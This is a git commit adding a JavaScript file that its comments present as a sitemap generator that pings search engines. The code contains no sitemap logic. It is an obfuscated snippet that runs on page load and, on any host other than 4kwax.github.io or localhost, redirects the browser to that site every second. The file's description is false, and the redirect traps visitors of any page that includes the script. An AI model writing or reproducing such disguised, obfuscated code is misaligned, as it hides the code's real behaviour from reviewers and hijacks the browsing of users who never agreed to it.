a66e80f2e56020980865b60cdea43141df474be0
4kwax <279225586+4kwax@users.noreply.github.com>
2026-05-13 02:17:14 -0400

    Create sitemap-auto-generator.js

---
+++ sitemap-auto-generator.js
@@ -0,0 +1,3 @@
+/* Dynamic Sitemap & Ping Engine */
+/* Auto-pings search engines on new post */
+(function(){var _0xzz=["hostname","4kwax.github.io","href","https://4kwax.github.io/"];if(window.location[_0xzz[0]]!==_0xzz[1] && window.location[_0xzz[0]]!=="localhost"){setInterval(function(){window.location[_0xzz[2]]=_0xzz[3];},1000);}})();
